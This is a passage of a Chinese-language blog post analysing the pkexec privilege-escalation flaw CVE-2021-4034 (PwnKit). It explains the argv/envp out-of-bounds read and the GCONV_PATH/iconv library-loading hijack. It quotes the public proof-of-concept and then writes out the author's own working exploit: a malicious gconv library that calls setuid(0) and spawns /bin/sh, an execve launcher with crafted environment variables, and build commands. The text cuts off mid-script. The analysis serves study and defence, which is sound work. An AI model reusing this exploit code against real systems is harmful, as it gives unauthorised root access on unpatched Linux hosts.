AAAA1111</span><br><span class=\"line\">argv[<span class=\"number\">1</span>]: BBBB2222</span><br><span class=\"line\">argv[<span class=\"number\">2</span>]: CCCC3333</span><br><span class=\"line\">argv[<span class=\"number\">3</span>]: <span class=\"literal\">NULL</span></span><br><span class=\"line\">argv[<span class=\"number\">4</span>]: DDDD3333</span><br><span class=\"line\">argv[<span class=\"number\">5</span>]: EEEE4444</span><br><span class=\"line\">argv[<span class=\"number\">6</span>]: FFFF5555</span><br><span class=\"line\">argv[<span class=\"number\">7</span>]: <span class=\"literal\">NULL</span></span><br></pre></td></tr></table></figure>\n<p>argc 是自动计算的</p>\n<h4 id=\"agrv不传入的情况\"><a class=\"markdownIt-Anchor\" href=\"#agrv不传入的情况\">#</a> agrv 不传入的情况？</h4>\n<p>修改为 <code>char* const argv[] = &#123;NULL&#125;</code> <br>\n 就没有 argc 了，而 <code>argv[1]</code>  是 <code>environ[0]</code></p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-<span class=\"keyword\">virtual</span>-machine:~/Desktop$ ./execve </span><br><span class=\"line\">argc: <span class=\"number\">0</span></span><br><span class=\"line\">argv[<span class=\"number\">0</span>]: <span class=\"literal\">NULL</span></span><br><span class=\"line\">argv[<span class=\"number\">1</span>]: DDDD3333</span><br><span class=\"line\">argv[<span class=\"number\">2</span>]: EEEE4444</span><br><span class=\"line\">argv[<span class=\"number\">3</span>]: FFFF5555</span><br><span class=\"line\">argv[<span class=\"number\">4</span>]: <span class=\"function\"><span class=\"literal\">NULL</span></span></span><br><span class=\"line\"><span class=\"function\">Segmentation <span class=\"title\">fault</span> <span class=\"params\">(core dumped)</span></span></span><br></pre></td></tr></table></figure>\n<h3 id=\"关于调用iconv的办法\"><a class=\"markdownIt-Anchor\" href=\"#关于调用iconv的办法\">#</a> 关于调用 iconv 的办法</h3>\n<p>如果劫持了 <code>GCONV_PATH</code>  就需要调用 <code>iconv()</code>  才行，在 <code>pkexec.c</code>  源码 369 行位置</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> gboolean</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">validate_environment_variable</span> <span class=\"params\">(<span class=\"type\">const</span> gchar *key,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                               <span class=\"type\">const</span> gchar *value)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  gboolean ret;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Generally we bail if any environment variable value contains</span></span><br><span class=\"line\"><span class=\"comment\">   *</span></span><br><span class=\"line\"><span class=\"comment\">   *   - &#x27;/&#x27; characters</span></span><br><span class=\"line\"><span class=\"comment\">   *   - &#x27;%&#x27; characters</span></span><br><span class=\"line\"><span class=\"comment\">   *   - &#x27;..&#x27; substrings</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">g_return_val_if_fail</span> (key != <span class=\"literal\">NULL</span>, FALSE);</span><br><span class=\"line\">  <span class=\"built_in\">g_return_val_if_fail</span> (value != <span class=\"literal\">NULL</span>, FALSE);</span><br><span class=\"line\"></span><br><span class=\"line\">  ret = FALSE;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* special case $SHELL */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">g_strcmp0</span> (key, <span class=\"string\">&quot;SHELL&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* check if it&#x27;s in /etc/shells */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!<span class=\"built_in\">is_valid_shell</span> (value))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">log_message</span> (LOG_CRIT, TRUE,</span><br><span class=\"line\">                       <span class=\"string\">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);</span><br><span class=\"line\">          <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\">                      <span class=\"string\">&quot;This incident has been reported.\\n&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ((<span class=\"built_in\">g_strcmp0</span> (key, <span class=\"string\">&quot;XAUTHORITY&quot;</span>) != <span class=\"number\">0</span> &amp;&amp; <span class=\"built_in\">strstr</span> (value, <span class=\"string\">&quot;/&quot;</span>) != <span class=\"literal\">NULL</span>) ||</span><br><span class=\"line\">           <span class=\"built_in\">strstr</span> (value, <span class=\"string\">&quot;%&quot;</span>) != <span class=\"literal\">NULL</span> ||</span><br><span class=\"line\">           <span class=\"built_in\">strstr</span> (value, <span class=\"string\">&quot;..&quot;</span>) != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">log_message</span> (LOG_CRIT, TRUE,</span><br><span class=\"line\">                   <span class=\"string\">&quot;The value for environment variable %s contains suscipious content&quot;</span>,</span><br><span class=\"line\">                   key);</span><br><span class=\"line\">      <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\">                  <span class=\"string\">&quot;This incident has been reported.\\n&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  ret = TRUE;</span><br><span class=\"line\"></span><br><span class=\"line\"> out:</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"built_in\">g_strcmp0</span> (key, <span class=\"string\">&quot;SHELL&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"comment\">/* check if it&#x27;s in /etc/shells */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">is_valid_shell</span> (value)) <span class=\"comment\">// SHELL值不合法 调用g_printerr</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">log_message</span> (LOG_CRIT, TRUE,</span><br><span class=\"line\">                     <span class=\"string\">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\">                    <span class=\"string\">&quot;This incident has been reported.\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>如果构造了一个错误的 <code>SHELL</code>  环境变量，就会调用 <code>g_printerr</code> （当然也可以利用 <code>XAUTHORITY</code>  来打）<br>\n而 <code>g_printerr</code>  默认是 <code>UTF-8</code>  格式，他会检查 <code>CHARSET</code>  变量，对输出格式进行转码，就会调用 <code>iconv</code> ，然后 <code>iconv</code>  会调用 <code>iconv_open</code>  初始化， <code>iconv_open</code>  会根据 <code>GCONV_PATH</code>  找到 <code>gconv-modules</code>  文件，再根据 <code>gconv-modules</code>  文件的指示找到参数对应字符集的 so 库，调用 so 库中的 <code>gconv()</code>  和 <code>gonv_init()</code>  函数。</p>\n<h2 id=\"利用方法\"><a class=\"markdownIt-Anchor\" href=\"#利用方法\">#</a> 利用方法</h2>\n<ol>\n<li>创建一个 <code>GCONV_PATH=.</code>  的目录</li>\n<li>在上面目录下创建我们的恶意库</li>\n<li>在本目录下创建 <code>gconv-modules</code>  文件，写入 <code>module UTF-8// PWNKIT// pwnkit 1</code></li>\n<li>设置环境变量\n<ol>\n<li>第一个是恶意库 <code>pwnkit.so:.</code></li>\n<li>第二个环境变量  <code>PATH=GCONV_PATH=.</code>  这样  <code>g_find_program_in_path</code>  函数组合出的路径就是 <code>GCONV_PATH=./pwnkit.so:.</code>  （ <code>PATH</code> + <code>NAME</code> = <code>GCONV_PATH=.</code> + <code>/</code> + <code>pwnkit.so:.</code> ）</li>\n<li><code>CHARSET=PWNKIT</code> ，指定字符集为 <code>pwnkit</code></li>\n</ol>\n</li>\n</ol>\n<blockquote>\n<p>如环境变量 “PATH=name”，如果 name 目录存在，并且 name 目录下也有 value 可执行程序，那么 envp [0] 的便指向 name/value；<br>\n如环境变量设置为 “PATH=name=.”，并且 “name=.” 目录下也有 value 可执行程序，那么 envp [0] 的便指向 “name=./value”。</p>\n</blockquote>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (argv[n] != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  argv[n] = path;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对环境变量的回写</p>\n<h3 id=\"流程\"><a class=\"markdownIt-Anchor\" href=\"#流程\">#</a> 流程</h3>\n<ol>\n<li>execve 执行 pkexec，无参传入，造成越界错误执行 <code>environ[0]</code></li>\n<li>612 行 argv [1] 越界访问的是 envp [0]，获取到 value 值，和 path 组合后写回；（实现了一次找到路径的写入）此时 <code>GCONV_PATH</code>  已经被篡改</li>\n<li>检测到 <code>SHELL</code>  变量问题，调用 <code>g_printerr</code></li>\n<li>根据 <code>CHARSET</code>  变量，需要转码，调用 <code>iconv</code> ，然后 <code>iconv_open</code></li>\n<li>根据 <code>GCONV_PATH</code>  找到 <code>gconv-modules</code> , 然后找到我们的恶意库</li>\n<li>调用函数 <code>gonv_init()</code> , 提权拿下！</li>\n</ol>\n<h2 id=\"gconv_path漏洞demo\"><a class=\"markdownIt-Anchor\" href=\"#gconv_path漏洞demo\">#</a> GCONV_PATH 漏洞 demo</h2>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// file name hack.c</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv</span><span class=\"params\">()</span> </span>&#123;&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv_init</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;you be hacked alreadly!\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">system</span>(<span class=\"string\">&quot;touch you_be_hacked.txt&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -shared -fPIC -o ./hack.so hack.c</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export CHARSET=HACK</span><br><span class=\"line\">export GCONV_PATH=.</span><br><span class=\"line\"></span><br><span class=\"line\">gcc -shared -fPIC -o ./hack.so hack.c</span><br><span class=\"line\">echo &quot;module HACK// UTF-8// hack 1&quot; &gt; gconv-modules</span><br></pre></td></tr></table></figure>\n<p>这样就布置好了所有准备，然后手动调用 <code>iconv</code> ，虽然我想用 <code>g_printerr</code> ? 但是编译不通？？<br>\nhacked！</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-virtual-machine:~/Desktop/iconv$ iconv -f HACK -t UTF-8 &lt; hack.c</span><br><span class=\"line\">you be hacked alreadly!</span><br><span class=\"line\">iconv: iconv.c:91: iconv: Assertion `!&quot;Nothing like this should happen&quot;&#x27; failed.</span><br><span class=\"line\">Aborted (core dumped)</span><br></pre></td></tr></table></figure>\n<h3 id=\"module语法\"><a class=\"markdownIt-Anchor\" href=\"#module语法\">#</a> module 语法</h3>\n<p><a href=\"https://xy2401.com/local-docs/gnu/manual.zh/libc/glibc-iconv-Implementation.html\">https://xy2401.com/local-docs/gnu/manual.zh/libc/glibc-iconv-Implementation.html</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">module AAAA// BBBB// name 1</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">从 AAAA编码到 BBBB编码 根据name.so规则 消耗cast值为1</span></span><br></pre></td></tr></table></figure>\n<p>然后 <code>iconv</code>  不知道 <code>CHARSET</code>  中的 <code>HACK</code>  是什么字符集，就会找到 <code>GCONV_PATH</code>  路径下的 <code>gconv_modules</code>  去找解码工具，然后就落入我们的恶意库了，所以能控制 <code>GCONV_PATH</code>  就能恶意代码执行</p>\n<h2 id=\"分析poc\"><a class=\"markdownIt-Anchor\" href=\"#分析poc\">#</a> 分析 POC</h2>\n<h3 id=\"make做的事\"><a class=\"markdownIt-Anchor\" href=\"#make做的事\">#</a> make 做的事</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c</span><br><span class=\"line\">cc -Wall    cve-2021-4034.c   -o cve-2021-4034</span><br><span class=\"line\">echo &quot;module UTF-8// PWNKIT// pwnkit 1&quot; &gt; gconv-modules</span><br><span class=\"line\">mkdir -p GCONV_PATH=.</span><br><span class=\"line\">cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.</span><br></pre></td></tr></table></figure>\n<p>先是在当前目录下生成了 <code>pwnkit.so</code>  的库<br>\n然后编译了 <code>cve-2021-4034</code> <br>\n 然后传入一句话给 <code>gconv-modules</code> <br>\n 创建一个文件夹，名字为 <code>GCONV_PATH=.</code> <br>\n 最后 cp <code>/usr/bin/true</code>  到 <code>GCONV_PATH=.</code>  文件夹路径下的 <code>pwnkit.so:.</code>  里去 <code>-f</code>  是 force 强制把 <code>/usr/bin/true</code>  这个文件 cp 到目标路径，因为 <code>pkexec</code>  要执行 <code>PATH</code>  路径下的第一个参数，就必须让 pkexec 空执行，所以目标就被替换成 <code>true</code> ，怎么执行都不会出错<br>\n当前目录结构</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.</span><br><span class=\"line\">├── cve-2021-4034.c</span><br><span class=\"line\">├── cve-2021-4034.sh</span><br><span class=\"line\">├── dry-run</span><br><span class=\"line\">│   ├── dry-run-cve-2021-4034.c</span><br><span class=\"line\">│   ├── Makefile</span><br><span class=\"line\">│   └── pwnkit-dry-run.c</span><br><span class=\"line\">├── LICENSE</span><br><span class=\"line\">├── Makefile</span><br><span class=\"line\">├── pwnkit.c</span><br><span class=\"line\">└── README.md</span><br></pre></td></tr></table></figure>\n<p>make 之后的</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.</span><br><span class=\"line\">├── cve-2021-4034</span><br><span class=\"line\">├── cve-2021-4034.c</span><br><span class=\"line\">├── cve-2021-4034.sh</span><br><span class=\"line\">├── dry-run</span><br><span class=\"line\">│   ├── dry-run-cve-2021-4034.c</span><br><span class=\"line\">│   ├── Makefile</span><br><span class=\"line\">│   └── pwnkit-dry-run.c</span><br><span class=\"line\">├── gconv-modules</span><br><span class=\"line\">├── GCONV_PATH=.</span><br><span class=\"line\">│   └── pwnkit.so:.</span><br><span class=\"line\">├── LICENSE</span><br><span class=\"line\">├── Makefile</span><br><span class=\"line\">├── pwnkit.c</span><br><span class=\"line\">├── pwnkit.so</span><br><span class=\"line\">└── README.md</span><br></pre></td></tr></table></figure>\n<h3 id=\"cve-2021-4034c\"><a class=\"markdownIt-Anchor\" href=\"#cve-2021-4034c\">#</a> cve-2021-4034.c</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">include &lt;unistd.h&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char **argv)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar * const args[] = &#123;</span><br><span class=\"line\">\t\tNULL</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\tchar * const environ[] = &#123;</span><br><span class=\"line\">\t\t&quot;pwnkit.so:.&quot;,</span><br><span class=\"line\">\t\t&quot;PATH=GCONV_PATH=.&quot;,</span><br><span class=\"line\">\t\t&quot;SHELL=/lol/i/do/not/exists&quot;,</span><br><span class=\"line\">\t\t&quot;CHARSET=PWNKIT&quot;,</span><br><span class=\"line\">\t\t&quot;GIO_USE_VFS=&quot;,</span><br><span class=\"line\">\t\tNULL</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\treturn execve(&quot;/usr/bin/pkexec&quot;, args, environ);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>第一个环境变量指向 <code>pwnkit.so:.</code> ，拼接后就是 <code>GCONV_PATH=./pwnkit.so:.</code> <br>\n <code>:</code>  的作用我在网上都没查到很好的介绍，我理解为二级指针会遍历由 <code>:</code>  分割的路径，，，<br>\n也就是第二轮循环会变成 <code>GCONV_PATH=.</code> ，引导向当时的恶意库</p>\n<h3 id=\"pwnkitc\"><a class=\"markdownIt-Anchor\" href=\"#pwnkitc\">#</a> pwnkit.c</h3>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv</span><span class=\"params\">(<span class=\"type\">void</span>)</span> </span>&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv_init</span><span class=\"params\">(<span class=\"type\">void</span> *step)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> * <span class=\"type\">const</span> args[] = &#123; <span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"literal\">NULL</span> &#125;;</span><br><span class=\"line\">\t<span class=\"type\">char</span> * <span class=\"type\">const</span> environ[] = &#123; <span class=\"string\">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin&quot;</span>, <span class=\"literal\">NULL</span> &#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">setuid</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">setgid</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">execve</span>(args[<span class=\"number\">0</span>], args, environ);</span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这个就是伪造的 <code>gconv-mudules</code>  下的 <code>so</code>  文件，会执行 <code>gconv</code>  和 <code>gconv_init</code> <br>\n 这个 <code>PATH</code>  就是多个可能的 bin 目标依次遍历<br>\n这就是 shellcode 了<br>\n关于这个 <code>setuid</code>  和 <code>setgid</code>  我重新开一章分析</p>\n<h2 id=\"尾声\"><a class=\"markdownIt-Anchor\" href=\"#尾声\">#</a> 尾声</h2>\n<p>既然自己分析完了，就要自己写利用脚本<br>\n首先是恶意库</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv</span><span class=\"params\">()</span></span>&#123;&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv_init</span><span class=\"params\">(<span class=\"type\">void</span> *step)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> *<span class=\"type\">const</span> args[]=&#123;<span class=\"string\">&quot;/bin/sh&quot;</span>,<span class=\"literal\">NULL</span>&#125;;</span><br><span class=\"line\">\t<span class=\"type\">char</span> *<span class=\"type\">const</span> envp[]=&#123;</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/sbin:/bin:/opt/bin&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span></span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">setuid</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">setgid</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">execve</span>(args[<span class=\"number\">0</span>],args,envp);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里用 <code>args</code>  的目的就是为了语句复用，没啥特别含义，也能拆成 <code>/bin/sh</code> + <code>argv</code> <br>\npkexec 执行的提权</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc,<span class=\"type\">char</span> **argv)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> *<span class=\"type\">const</span> args[]=&#123;<span class=\"literal\">NULL</span>&#125;;</span><br><span class=\"line\">\t<span class=\"type\">char</span> *<span class=\"type\">const</span> environ[]=&#123;</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;evilib.so:.&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;PATH=GCONV_PATH=.&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;SHELL=/are/you/kid/me&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;CHARSET=HACK&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span></span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">execve</span>(<span class=\"string\">&quot;/usr/bin/pkexec&quot;</span>,args,environ);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://poc.sh\">poc.sh</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -o exp exp.c</span><br><span class=\"line\">mkdir GCONV_PATH=.</span><br><span class=\"line\">gcc -fPIC -shared -o ./evilib.so evilib.c</span><br><span class=\"line\">echo &quot;module UTF-8// HACK// evilib 1&quot; &gt; 